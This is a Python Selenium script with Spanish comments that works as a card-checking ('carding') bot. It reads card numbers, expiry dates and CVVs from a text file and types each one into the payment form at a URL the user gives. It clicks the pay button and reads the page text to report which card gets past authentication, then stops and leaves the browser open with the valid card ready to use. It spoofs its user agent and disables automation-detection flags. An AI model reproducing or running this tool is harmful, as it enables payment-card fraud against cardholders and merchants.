import os
import re
import sys
import time
import datetime
import threading
import subprocess
from selenium import webdriver
from selenium.webdriver.edge.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Habilitar soporte de colores ANSI en Windows
os.system('')

# Colores y estilos para la consola
C_RESET = "\033[0m"
C_BOLD = "\033[1m"
C_CYAN = "\033[96m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RED = "\033[91m"
C_MAGENTA = "\033[95m"
C_BLUE = "\033[94m"
C_GRAY = "\033[90m"
C_WHITE = "\033[97m"

# Lock para sincronizar salidas por consola si fuera necesario
print_lock = threading.Lock()
log_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "debug.log")

def registrar_log(bot_id, num_tarjeta, estado, mensaje):
    """
    Imprime en consola con formato de panel y escribe en debug.log
    """
    ahora = datetime.datetime.now().strftime("%H:%M:%S")
    
    # Asignar color según el estado
    estado_upper = estado.upper()
    if "PROBANDO" in estado_upper:
        color_estado = f"{C_YELLOW}{C_BOLD}[PROBANDO]{C_RESET}"
    elif "AHORR" in estado_upper or "BOTON" in estado_upper or "PAGAR" in estado_upper:
        color_estado = f"{C_MAGENTA}{C_BOLD}[BOTÓN]{C_RESET}"
    elif "ESPER" in estado_upper:
        color_estado = f"{C_CYAN}{C_BOLD}[ESPERANDO]{C_RESET}"
    elif "VALIDA" in estado_upper:
        color_estado = f"{C_GREEN}{C_BOLD}[VÁLIDA]{C_RESET}"
    elif "EXITO" in estado_upper or "COMPLETADO" in estado_upper:
        color_estado = f"{C_GREEN}{C_BOLD}[COMPLETADO]{C_RESET}"
    elif "CERRANDO" in estado_upper:
        color_estado = f"{C_BLUE}{C_BOLD}[CERRANDO]{C_RESET}"
    elif "SIGUIENTE" in estado_upper:
        color_estado = f"{C_YELLOW}{C_BOLD}[SIGUIENTE]{C_RESET}"
    elif "RECARG" in estado_upper:
        color_estado = f"{C_MAGENTA}{C_BOLD}[RECARGA]{C_RESET}"
    elif "AVISO" in estado_upper:
        color_estado = f"{C_YELLOW}{C_BOLD}[AVISO]{C_RESET}"
    elif "ERROR" in estado_upper or "FALLIDA" in estado_upper:
        color_estado = f"{C_RED}{C_BOLD}[ERROR]{C_RESET}"
    else:
        color_estado = f"{C_WHITE}{C_BOLD}[{estado_upper}]{C_RESET}"

    num_mostrar = f"({num_tarjeta})" if num_tarjeta else ""
    linea_consola = (
        f"{C_GRAY}[{ahora}]{C_RESET} {color_estado:<22} "
        f"{C_BLUE}[Bot {bot_id:>2}]{C_RESET} "
        f"{C_WHITE}{num_mostrar:<20}{C_RESET} {mensaje}"
    )

    linea_archivo = f"[{ahora}] [{estado_upper:<11}] [Bot {bot_id:>2}] {num_mostrar}: {mensaje}\n"

    with print_lock:
        print(linea_consola)
        try:
            with open(log_file_path, "a", encoding="utf-8") as f:
                f.write(linea_archivo)
        except Exception:
            pass

def obtener_tarjetas(archivo="a.txt"):
    """
    Lee 'a.txt' y extrae todas las tarjetas en fila.
    Cada fila contiene 23 números:
      - 16 dígitos iniciales (número de tarjeta)
      - 4 dígitos siguientes (fecha exp MM/AA)
      - 3 dígitos finales (CVV)
    Ignora cualquier símbolo separador (| , / espacios, etc.)
    """
    ruta_archivo = os.path.join(os.path.dirname(os.path.abspath(__file__)), archivo)
    
    if not os.path.exists(ruta_archivo):
        print(f"\n{C_RED}[!] Error: No se encontró el archivo '{archivo}' en la carpeta del script.{C_RESET}")
        print(f"{C_YELLOW}[i] Por favor crea el archivo '{archivo}' con las tarjetas.{C_RESET}")
        input("\nPresiona Enter para salir...")
        sys.exit(1)
        
    with open(ruta_archivo, "r", encoding="utf-8") as f:
        contenido = f.read()

    tarjetas = []
    lineas = contenido.strip().splitlines()

    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        digitos = re.sub(r"\D", "", linea)
        
        # Si la línea tiene 23 dígitos o múltiplos de 23
        if len(digitos) >= 23:
            for i in range(0, len(digitos), 23):
                bloque = digitos[i:i+23]
                if len(bloque) >= 16:
                    p16 = bloque[:16]
                    p4 = bloque[16:20] if len(bloque) >= 20 else bloque[16:]
                    p3 = bloque[20:23] if len(bloque) >= 23 else bloque[20:]
                    tarjetas.append((p16, p4, p3))
        elif len(digitos) >= 16:
            p16 = digitos[:16]
            p4 = digitos[16:20] if len(digitos) >= 20 else digitos[16:]
            p3 = digitos[20:23] if len(digitos) >= 23 else digitos[20:]
            tarjetas.append((p16, p4, p3))

    return tarjetas

def crear_driver(es_headless):
    """
    Inicializa una única instancia del navegador Edge configurada.
    """
    edge_options = Options()
    edge_options.page_load_strategy = 'eager'

    if es_headless:
        edge_options.add_argument("--headless=new")
        edge_options.add_argument("--disable-gpu")
        edge_options.add_argument("--window-size=1920,1080")
    else:
        edge_options.add_argument("--start-maximized")

    edge_options.add_argument("--no-sandbox")
    edge_options.add_argument("--disable-dev-shm-usage")
    edge_options.add_argument("--disable-blink-features=AutomationControlled")
    edge_options.add_argument("--disable-notifications")
    edge_options.add_argument("--log-level=3")
    edge_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    edge_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0")

    driver = webdriver.Edge(options=edge_options)
    driver.set_page_load_timeout(16)
    driver.set_script_timeout(10)
    return driver

def cerrar_driver_seguro(driver, bot_id=1, num_tarjeta=""):
    """
    Cierra el driver garantizando que el proceso NUNCA se quede congelado
    y elimina los procesos huérfanos asociados al driver en Windows.
    """
    if not driver:
        return

    registrar_log(bot_id, num_tarjeta, "CERRANDO", "Cerrando navegador...")
    driver_pid = None
    try:
        if hasattr(driver, 'service') and driver.service and driver.service.process:
            driver_pid = driver.service.process.pid
    except Exception:
        pass

    def _do_quit():
        try:
            driver.quit()
        except Exception:
            pass

    t = threading.Thread(target=_do_quit)
    t.daemon = True
    t.start()
    t.join(timeout=3.5)

    # Si msedgedriver o sus subprocesos no se cerraron tras el timeout:
    if driver_pid:
        try:
            subprocess.run(
                ["taskkill", "/F", "/T", "/PID", str(driver_pid)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

def hacer_clic_en_ahorrar(driver, bot_id, num_tarjeta, timeout=10):
    """
    Busca en la página el botón final de confirmación ('ahorrar', 'pagar', 'guardar')
    y hace clic en él (incluso dentro de iframes).
    """
    registrar_log(bot_id, num_tarjeta, "BOTÓN", "Buscando botón final ('ahorrar' / 'pagar')...")
    start_time = time.time()
    
    mayus = "ABCDEFGHIJKLMNOPQRSTUVWXYZÁÉÍÓÚ"
    minus = "abcdefghijklmnopqrstuvwxyzáéíóú"
    palabras = ["ahorrar", "ahorra", "pagar", "paga", "guardar", "pay", "save", "continuar", "confirmar"]

    def buscar_y_clicar_en_contexto():
        for palabra in palabras:
            xpath_exp = (
                f"//*[(self::button or self::input or self::a or self::span or self::div) and ("
                f"contains(translate(text(), '{mayus}', '{minus}'), '{palabra}') or "
                f"contains(translate(., '{mayus}', '{minus}'), '{palabra}') or "
                f"contains(translate(@value, '{mayus}', '{minus}'), '{palabra}') or "
                f"contains(translate(@aria-label, '{mayus}', '{minus}'), '{palabra}'))]"
            )
            elementos = driver.find_elements(By.XPATH, xpath_exp)
            visibles = [el for el in elementos if el.is_displayed()]
            if visibles:
                def prioridad(el):
                    tag = el.tag_name.lower()
                    p_tag = 0 if tag in ('button', 'input') else (1 if tag == 'a' else 2)
                    p_len = len(el.text.strip()) if el.text else 50
                    return (p_tag, p_len)

                visibles.sort(key=prioridad)
                target = visibles[0]
                
                try:
                    driver.execute_script("arguments[0].scrollIntoView({behavior: 'instant', block: 'center'});", target)
                except Exception:
                    pass
                time.sleep(0.2)
                
                try:
                    target.click()
                except Exception:
                    driver.execute_script("arguments[0].click();", target)
                return True

        # Botón de tipo submit visible como alternativa
        submits = driver.find_elements(By.CSS_SELECTOR, "button[type='submit'], input[type='submit']")
        for sub in submits:
            if sub.is_displayed():
                try:
                    driver.execute_script("arguments[0].click();", sub)
                    return True
                except Exception:
                    pass

        return False

    try:
        while time.time() - start_time < timeout:
            try:
                if buscar_y_clicar_en_contexto():
                    registrar_log(bot_id, num_tarjeta, "BOTÓN", "Clic realizado en el botón final con éxito.")
                    driver.switch_to.default_content()
                    return True

                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        if buscar_y_clicar_en_contexto():
                            registrar_log(bot_id, num_tarjeta, "BOTÓN", "Clic realizado en el botón (dentro de iframe).")
                            driver.switch_to.default_content()
                            return True
                        driver.switch_to.default_content()
                    except Exception:
                        driver.switch_to.default_content()
            except Exception:
                pass

            time.sleep(0.4)

        registrar_log(bot_id, num_tarjeta, "ERROR", f"No se encontró el botón tras {timeout}s.")
        return False
    finally:
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

def normalizar_texto(texto):
    """
    Convierte texto a minúsculas y elimina tildes para comparaciones limpias.
    """
    if not texto:
        return ""
    texto = texto.lower()
    for con, sin in [('á', 'a'), ('é', 'e'), ('í', 'i'), ('ó', 'o'), ('ú', 'u'), ('ü', 'u')]:
        texto = texto.replace(con, sin)
    return texto

def extraer_textos_pagina(driver):
    """
    Extrae el texto visible de la página principal y de todos los iframes presentes,
    excluyendo scripts y estilos para evitar falsos positivos con código interno.
    """
    textos = []
    
    js_extract = """
    function getVisibleText() {
        var b = document.body;
        if (!b) return "";
        var clone = b.cloneNode(true);
        var toRemove = clone.querySelectorAll("script, style, noscript");
        for (var i = 0; i < toRemove.length; i++) {
            toRemove[i].parentNode.removeChild(toRemove[i]);
        }
        return (clone.innerText || clone.textContent || "");
    }
    return getVisibleText();
    """

    # 1. Título y URL actual
    try:
        if driver.title:
            textos.append(driver.title)
    except Exception:
        pass
    try:
        if driver.current_url:
            textos.append(driver.current_url)
    except Exception:
        pass

    # 2. Texto visible de la ventana principal
    try:
        driver.switch_to.default_content()
        txt_body = driver.execute_script(js_extract)
        if txt_body:
            textos.append(txt_body)
    except Exception:
        pass

    # 3. Textos dentro de iframes (p. ej. pasarelas 3DS / Adyen / Redsys)
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for i in range(len(iframes)):
            try:
                driver.switch_to.default_content()
                iframes_actual = driver.find_elements(By.TAG_NAME, "iframe")
                if i < len(iframes_actual):
                    driver.switch_to.frame(iframes_actual[i])
                    txt_frame = driver.execute_script(js_extract)
                    if txt_frame:
                        textos.append(txt_frame)
                    
                    # Comprobar sub-iframes anidados
                    sub_iframes = driver.find_elements(By.TAG_NAME, "iframe")
                    for sub in sub_iframes:
                        try:
                            driver.switch_to.frame(sub)
                            txt_sub = driver.execute_script(js_extract)
                            if txt_sub:
                                textos.append(txt_sub)
                            driver.switch_to.parent_frame()
                        except Exception:
                            pass
            except Exception:
                pass
    except Exception:
        pass
    finally:
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

    return " \n ".join(textos)

def verificar_estado_pago(driver):
    """
    Evalúa si la página indica:
      - 'VALIDA': si aparece 'redireccionando...'
      - 'ERROR': si aparece 'autenticación fallida' o 'error'
    Retorna (estado, detalle) o (None, None).
    """
    try:
        # 1. Comprobar posible alerta emergente nativa
        try:
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert_norm = normalizar_texto(alert_text)
            if "redireccionando" in alert_norm or "redirigiendo" in alert_norm:
                return ("VALIDA", f"Alerta: {alert_text}")
            if "error" in alert_norm or "fallida" in alert_norm or "denegada" in alert_norm:
                try:
                    alert.accept()
                except Exception:
                    pass
                return ("ERROR", f"Alerta emergente: {alert_text}")
        except Exception:
            pass

        # 2. Extraer texto visible
        texto_completo = extraer_textos_pagina(driver)
        texto_norm = normalizar_texto(texto_completo)

        # A) Prioridad: Comprobar si es VÁLIDA ("Redireccionando...")
        if "redireccionando" in texto_norm or "redirigiendo" in texto_norm:
            return ("VALIDA", "Redireccionando...")

        # B) Comprobar si hay AUTENTICACIÓN FALLIDA o ERROR
        if "autenticacion fallida" in texto_norm or "autenticacion ha fallado" in texto_norm:
            return ("ERROR", "Autenticación fallida")

        if re.search(r"\berror\b", texto_norm):
            match = re.search(r"[^\n.]{0,35}\berror\b[^\n.]{0,35}", texto_norm)
            snippet = match.group(0).strip() if match else "Error"
            return ("ERROR", f"Error detectado ({snippet})")

        if ("fallo la autenticacion" in texto_norm or 
            "pago rechazado" in texto_norm or 
            "tarjeta rechazada" in texto_norm or 
            "transaccion denegada" in texto_norm or 
            "operacion denegada" in texto_norm):
            return ("ERROR", "Operación rechazada/denegada")

    except Exception:
        pass

    return (None, None)

def recargar_link_cmd(driver, link, bot_id=1, num_tarjeta=""):
    """
    Recarga la pestaña escribiendo de nuevo en el navegador el enlace que se introdujo en el CMD.
    """
    registrar_log(bot_id, num_tarjeta, "RECARGA", f"Recargando pestaña con enlace del CMD: {link}")
    try:
        driver.switch_to.default_content()
    except Exception:
        pass
    try:
        driver.get(link)
    except Exception:
        try:
            driver.execute_script("window.stop();")
        except Exception:
            pass

def probar_tarjeta(driver, bot_id, link, datos_tarjeta):
    """
    Ejecuta el ciclo de prueba de una tarjeta en el navegador ya abierto:
    1. Asegura volver al contexto principal y carga la URL.
    2. Rellena los datos de la tarjeta.
    3. Clica en el último botón ('ahorrar' / 'pagar').
    4. Monitorea la página durante 12 segundos:
       - Si aparece 'Redireccionando...': marca como VÁLIDA y detiene.
       - Si aparece 'Autenticación fallida' o 'error': recarga con el link del CMD y pasa a la siguiente.
       - Si transcurren los 12 segundos: recarga con el link del CMD y pasa a la siguiente.
    """
    parte_16, parte_4, parte_3 = datos_tarjeta

    try:
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

        registrar_log(bot_id, parte_16, "PROBANDO", f"Cargando URL: {link}")
        try:
            driver.get(link)
        except Exception:
            registrar_log(bot_id, parte_16, "AVISO", "Tiempo límite de carga alcanzado. Continuando con elementos...")
            try:
                driver.execute_script("window.stop();")
            except Exception:
                pass

        registrar_log(bot_id, parte_16, "PROBANDO", "Buscando campo de tarjeta...")
        wait = WebDriverWait(driver, 12)

        selector_tarjeta = "//input[@id='number' or @autocomplete='cc-number' or @autocomplete='a-number' or contains(@id, 'card') or contains(@name, 'card') or contains(@class, 'card-number')]"

        campo_input = None
        try:
            campo_input = wait.until(EC.element_to_be_clickable((By.XPATH, selector_tarjeta)))
        except Exception:
            try:
                campo_input = wait.until(EC.presence_of_element_located((By.XPATH, selector_tarjeta)))
            except Exception:
                # Comprobar si está dentro de algún iframe
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        campo_input = driver.find_element(By.XPATH, selector_tarjeta)
                        if campo_input:
                            break
                        driver.switch_to.default_content()
                    except Exception:
                        driver.switch_to.default_content()

        if not campo_input:
            registrar_log(bot_id, parte_16, "ERROR", "No se encontró el campo de tarjeta tras 12s. Recargando enlace...")
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
            return ("ERROR", "No se encontró campo de tarjeta")

        # 1. Focalizar, limpiar y escribir los primeros 16 dígitos
        try:
            campo_input.click()
        except Exception:
            driver.execute_script("arguments[0].click();", campo_input)
        
        try:
            campo_input.clear()
        except Exception:
            pass
        try:
            campo_input.send_keys(Keys.CONTROL + "a")
            campo_input.send_keys(Keys.BACKSPACE)
        except Exception:
            pass

        registrar_log(bot_id, parte_16, "PROBANDO", "Escribiendo los 16 dígitos de la tarjeta...")
        for char in parte_16:
            campo_input.send_keys(char)
            time.sleep(0.03)

        time.sleep(0.2)

        # 2. Pulsar Tabulador y escribir los siguientes 4 dígitos (fecha MM/AA)
        if parte_4:
            registrar_log(bot_id, parte_16, "PROBANDO", f"Pulsando Tabulador y escribiendo fecha ({parte_4})...")
            campo_input.send_keys(Keys.TAB)
            time.sleep(0.2)
            
            campo_2 = driver.switch_to.active_element
            try:
                campo_2.send_keys(Keys.CONTROL + "a")
                campo_2.send_keys(Keys.BACKSPACE)
            except Exception:
                pass
            for char in parte_4:
                campo_2.send_keys(char)
                time.sleep(0.03)

            time.sleep(0.2)

            # 3. Pulsar Tabulador de nuevo y escribir los 3 dígitos (CVV)
            if parte_3:
                registrar_log(bot_id, parte_16, "PROBANDO", f"Pulsando Tabulador y escribiendo CVV ({parte_3})...")
                campo_2.send_keys(Keys.TAB)
                time.sleep(0.2)

                campo_3 = driver.switch_to.active_element
                try:
                    campo_3.send_keys(Keys.CONTROL + "a")
                    campo_3.send_keys(Keys.BACKSPACE)
                except Exception:
                    pass
                for char in parte_3:
                    campo_3.send_keys(char)
                    time.sleep(0.03)

        registrar_log(bot_id, parte_16, "PROBANDO", "Datos completados en el formulario.")
        time.sleep(0.4)

        # Comprobar si al rellenar el formulario ya apareció algún error de validación
        estado_prev, detalle_prev = verificar_estado_pago(driver)
        if estado_prev == "ERROR":
            registrar_log(bot_id, parte_16, "ERROR", f"Detectado en formulario: '{detalle_prev}'. Recargando enlace...")
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
            return ("FALLIDA", detalle_prev)

        # 4. Clic en el último botón ('ahorrar' / 'pagar')
        clicado = hacer_clic_en_ahorrar(driver, bot_id=bot_id, num_tarjeta=parte_16)

        if not clicado:
            registrar_log(bot_id, parte_16, "ERROR", "No se encontró el botón final. Recargando enlace...")
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
            return ("ERROR", "No se encontró botón final")

        # 5. Periodo de 12 segundos para chequear 'Redireccionando...' o 'Autenticación fallida' / 'error'
        registrar_log(bot_id, parte_16, "ESPERANDO", "Botón pulsado. Monitoreando página durante 12 segundos...")
        inicio_espera = time.time()
        tiempo_limite = 12.0

        while time.time() - inicio_espera < tiempo_limite:
            estado, detalle = verificar_estado_pago(driver)

            # Si en algún momento pone 'Redireccionando...'
            if estado == "VALIDA":
                registrar_log(bot_id, parte_16, "VALIDA", f"¡¡¡ TARJETA VÁLIDA DETECTADA !!! ({detalle})")
                return ("VALIDA", f"VÁLIDA ({detalle})")

            # Si en algún momento pone 'Autenticación fallida' o 'error'
            if estado == "ERROR":
                registrar_log(bot_id, parte_16, "ERROR", f"Detectado en página: '{detalle}'. Recargando link del CMD...")
                recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
                return ("FALLIDA", detalle)

            time.sleep(0.3)

        # Si transcurrieron los 12 segundos sin redirección ni error detectado
        registrar_log(bot_id, parte_16, "AVISO", "12 segundos agotados sin redirección. Recargando link del CMD...")
        recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
        return ("TIMEOUT", "12s agotados sin redirección")

    except Exception as e:
        registrar_log(bot_id, parte_16, "ERROR", f"Error en tarjeta: {e}. Recargando enlace...")
        try:
            recargar_link_cmd(driver, link, bot_id=bot_id, num_tarjeta=parte_16)
        except Exception:
            pass
        return ("ERROR", f"Error: {e}")

def formatear_exp(exp):
    if len(exp) == 4:
        return f"{exp[:2]}/{exp[2:]}"
    return exp

def imprimir_panel_inicio(tarjetas):
    print(f"\n{C_CYAN}╔════════════════════════════════════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}║{C_WHITE}{C_BOLD}                   PANEL DE CONTROL - BOTS AUTOFILL (EDGE)                      {C_RESET}{C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}╠════════════════════════════════════════════════════════════════════════════════╣{C_RESET}")
    print(f"{C_CYAN}║{C_WHITE}  Tarjetas detectadas en 'a.txt': {C_GREEN}{len(tarjetas):<46}{C_RESET}{C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}╟─────┬──────────────────────────┬──────────┬───────┬────────────────────────────╢{C_RESET}")
    print(f"{C_CYAN}║{C_YELLOW}  #  {C_CYAN}│{C_YELLOW} Tarjeta (16 dígitos)     {C_CYAN}│{C_YELLOW} Exp (4)  {C_CYAN}│{C_YELLOW} CVV   {C_CYAN}│{C_YELLOW} Estado en cola              {C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}╟─────┼──────────────────────────┼──────────┼───────┼────────────────────────────╢{C_RESET}")
    
    for idx, (p16, p4, p3) in enumerate(tarjetas, 1):
        exp_fmt = formatear_exp(p4)
        print(f"{C_CYAN}║{C_WHITE} {idx:>2}  {C_CYAN}│{C_WHITE} {p16:<24} {C_CYAN}│{C_WHITE} {exp_fmt:<8} {C_CYAN}│{C_WHITE} {p3:<5} {C_CYAN}│{C_GREEN} En cola para probar        {C_RESET}{C_CYAN}║{C_RESET}")
        
    print(f"{C_CYAN}╚═════╧══════════════════════════╧══════════╧═══════╧════════════════════════════╝{C_RESET}\n")

def imprimir_panel_ejecucion(total_tarjetas, es_headless):
    modo_txt = "Segundo plano (Headless)" if es_headless else "Visible (Con ventana)"
    print(f"\n{C_MAGENTA}╔════════════════════════════════════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_MAGENTA}║{C_WHITE}{C_BOLD}                    CONFIGURACIÓN Y COMIENZO DE SESIÓN                           {C_RESET}{C_MAGENTA}║{C_RESET}")
    print(f"{C_MAGENTA}╠════════════════════════════════════════════════════════════════════════════════╣{C_RESET}")
    print(f"{C_MAGENTA}║{C_WHITE}  Total tarjetas en lista: {C_GREEN}{total_tarjetas:<9}{C_WHITE} | Modo: {C_CYAN}{modo_txt:<32}{C_RESET}{C_MAGENTA}║{C_RESET}")
    print(f"{C_MAGENTA}║{C_WHITE}  Navegadores abiertos:    {C_YELLOW}1 Navegador {C_WHITE} | Flujo: {C_GREEN}Prueba 1 a 1 en la misma ventana {C_RESET}{C_MAGENTA}║{C_RESET}")
    print(f"{C_MAGENTA}╚════════════════════════════════════════════════════════════════════════════════╝{C_RESET}\n")
    print(f"{C_CYAN}--- REGISTRO DE EVENTOS EN TIEMPO REAL (LOG) ---{C_RESET}\n")

def imprimir_panel_resumen(tarjetas, resultados_dict):
    total_tarjetas = len(tarjetas)
    print(f"\n{C_GREEN}╔════════════════════════════════════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_GREEN}║{C_WHITE}{C_BOLD}                            RESUMEN FINAL DE PRUEBAS                             {C_RESET}{C_GREEN}║{C_RESET}")
    print(f"{C_GREEN}╠═════╤══════════════════════════╤══════════╤═══════╤════════════════════════════╣{C_RESET}")
    print(f"{C_GREEN}║{C_YELLOW}  #  {C_GREEN}│{C_YELLOW} TARJETA PROBADA          {C_GREEN}│{C_YELLOW} EXP      {C_GREEN}│{C_YELLOW} CVV   {C_GREEN}│{C_YELLOW} RESULTADO                   {C_GREEN}║{C_RESET}")
    print(f"{C_GREEN}╠═════╪══════════════════════════╪══════════╪═══════╪════════════════════════════╣{C_RESET}")
    for idx in range(1, total_tarjetas + 1):
        if idx in resultados_dict:
            p16, p4, p3, res = resultados_dict[idx]
            color_res = C_GREEN if ("válida" in res.lower() or "valida" in res.lower() or "redireccionando" in res.lower()) else C_RED
            print(f"{C_GREEN}║{C_WHITE} {idx:>2}  {C_GREEN}│{C_WHITE} {p16:<24} {C_GREEN}│{C_WHITE} {formatear_exp(p4):<8} {C_GREEN}│{C_WHITE} {p3:<5} {C_GREEN}│ {color_res}{res[:26]:<26}{C_RESET} {C_GREEN}║{C_RESET}")
        else:
            p16, p4, p3 = tarjetas[idx - 1]
            print(f"{C_GREEN}║{C_WHITE} {idx:>2}  {C_GREEN}│{C_WHITE} {p16:<24} {C_GREEN}│{C_WHITE} {formatear_exp(p4):<8} {C_GREEN}│{C_WHITE} {p3:<5} {C_GREEN}│ {C_GRAY}{'Omitida (detenido)':<26}{C_RESET} {C_GREEN}║{C_RESET}")
    print(f"{C_GREEN}╚═════╧══════════════════════════╧══════════╧═══════╧════════════════════════════╝{C_RESET}\n")

def main():
    # 1. Leer todas las tarjetas de a.txt
    tarjetas = obtener_tarjetas("a.txt")
    total_tarjetas = len(tarjetas)
    
    if total_tarjetas == 0:
        print(f"{C_RED}[!] Error: No se encontraron tarjetas válidas (mínimo 16 dígitos) en a.txt.{C_RESET}")
        input("\nPresiona Enter para salir...")
        return

    # Mostrar panel visual inicial con tarjetas encontradas
    imprimir_panel_inicio(tarjetas)

    # 2. Pedir link al usuario
    link = input(f"{C_BOLD}Introduce el enlace / URL de la página: {C_RESET}").strip()
    if not link:
        print(f"{C_RED}[!] No introdujiste ningún enlace.{C_RESET}")
        return

    if not (link.startswith("http://") or link.startswith("https://")):
        link = "https://" + link

    # 3. Preguntar si desea modo Headless o con ventana visible (por defecto con ventana visible)
    while True:
        resp_h = input(f"{C_BOLD}¿Ejecutar en segundo plano (Headless / sin ventana)? (s/n) [Por defecto: n]: {C_RESET}").strip().lower()
        if resp_h in ('n', 'no', ''):
            es_headless = False
            break
        elif resp_h in ('s', 'si', 'y', 'yes'):
            es_headless = True
            break
        else:
            print(f"{C_RED}[!] Responde 's' para segundo plano o 'n' para ver la ventana.{C_RESET}")

    # Mostrar panel de ejecución
    imprimir_panel_ejecucion(total_tarjetas, es_headless)

    # Iniciar archivo debug.log con encabezado
    try:
        with open(log_file_path, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*70}\nNUEVA SESIÓN: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - MODO: 1 Navegador Secuencial - HEADLESS: {es_headless} - TARJETAS: {total_tarjetas}\n{'='*70}\n")
    except Exception:
        pass

    # Iniciar un único navegador Edge
    modo_txt = "segundo plano" if es_headless else "modo visible"
    registrar_log(1, "", "PROBANDO", f"Iniciando navegador único Edge ({modo_txt})...")
    driver = None
    try:
        driver = crear_driver(es_headless)
    except Exception as e:
        registrar_log(1, "", "ERROR", f"Error al abrir Edge: {e}")
        return

    resultados_dict = {}
    tarjeta_valida_encontrada = False
    tarjeta_valida_info = None

    try:
        # Probar cada tarjeta una por una en el mismo navegador
        for idx, tarjeta in enumerate(tarjetas, 1):
            p16, p4, p3 = tarjeta
            registrar_log(1, p16, "PROBANDO", f"Procesando tarjeta #{idx} de {total_tarjetas}...")

            # Comprobar que el navegador sigue activo; si se cerró, reabrirlo
            driver_activo = False
            try:
                _ = driver.current_window_handle
                driver_activo = True
            except Exception:
                driver_activo = False

            if not driver_activo:
                registrar_log(1, p16, "AVISO", "Navegador cerrado o desconectado. Reabriendo instancia...")
                try:
                    driver = crear_driver(es_headless)
                except Exception as e_driver:
                    registrar_log(1, p16, "ERROR", f"No se pudo reabrir el navegador: {e_driver}")
                    resultados_dict[idx] = (p16, p4, p3, f"Error navegador: {e_driver}")
                    continue

            try:
                estado_res, detalle_res = probar_tarjeta(driver, 1, link, tarjeta)
            except Exception as e_unexp:
                estado_res, detalle_res = ("ERROR", f"Error: {e_unexp}")
                registrar_log(1, p16, "ERROR", f"Excepción imprevista: {e_unexp}")

            resultados_dict[idx] = (p16, p4, p3, detalle_res)

            # Si se detectó 'Redireccionando...', parar el chequeo inmediatamente
            if estado_res == "VALIDA":
                tarjeta_valida_encontrada = True
                tarjeta_valida_info = (p16, p4, p3)
                break

            # Esperar 1 segundo antes de la siguiente tarjeta si quedan pendientes
            if idx < total_tarjetas:
                registrar_log(1, "", "SIGUIENTE", "Preparando siguiente tarjeta en 1 segundo...")
                time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[!] Proceso detenido por el usuario.{C_RESET}")

    # Mostrar panel con el resumen final de resultados
    imprimir_panel_resumen(tarjetas, resultados_dict)

    if tarjeta_valida_encontrada:
        p16_v, p4_v, p3_v = tarjeta_valida_info
        print(f"\n{C_GREEN}{C_BOLD}╔════════════════════════════════════════════════════════════════════════════════╗{C_RESET}")
        print(f"{C_GREEN}{C_BOLD}║                      ¡¡¡ TARJETA VÁLIDA DETECTADA !!!                          ║{C_RESET}")
        print(f"{C_GREEN}{C_BOLD}╠════════════════════════════════════════════════════════════════════════════════╣{C_RESET}")
        print(f"{C_GREEN}{C_BOLD}║{C_WHITE}  Tarjeta : {C_YELLOW}{p16_v:<24}{C_WHITE}  Exp: {C_YELLOW}{formatear_exp(p4_v):<8}{C_WHITE}  CVV: {C_YELLOW}{p3_v:<5}{C_WHITE}          {C_GREEN}{C_BOLD}║{C_RESET}")
        print(f"{C_GREEN}{C_BOLD}║{C_WHITE}  Estado  : {C_GREEN}{'VÁLIDA (Texto \"Redireccionando...\" detectado)':<58}{C_RESET}{C_GREEN}{C_BOLD}║{C_RESET}")
        print(f"{C_GREEN}{C_BOLD}║{C_WHITE}  Acción  : {C_CYAN}{'Chequeo detenido. Pestaña del navegador ABIERTA':<58}{C_RESET}{C_GREEN}{C_BOLD}║{C_RESET}")
        print(f"{C_GREEN}{C_BOLD}╚════════════════════════════════════════════════════════════════════════════════╝{C_RESET}\n")
        print(f"{C_YELLOW}[i] El navegador permanece abierto para que puedas utilizarlo.{C_RESET}")
        print(f"{C_CYAN}[i] Presiona ENTER en esta consola cuando desees cerrar el navegador y finalizar...{C_RESET}")
        try:
            input()
        except (KeyboardInterrupt, EOFError):
            pass
        registrar_log(1, p16_v, "CERRANDO", "Finalizando sesión tras validación exitosa. Cerrando navegador...")
        cerrar_driver_seguro(driver, 1)
    else:
        registrar_log(1, "", "CERRANDO", "Finalizadas las pruebas. Cerrando navegador...")
        cerrar_driver_seguro(driver, 1)
        print(f"{C_GREEN}[✓] Pruebas finalizadas.{C_RESET}")

    print(f"{C_GRAY}[i] El historial completo se ha guardado en 'debug.log'.{C_RESET}\n")

if __name__ == "__main__":
    main()
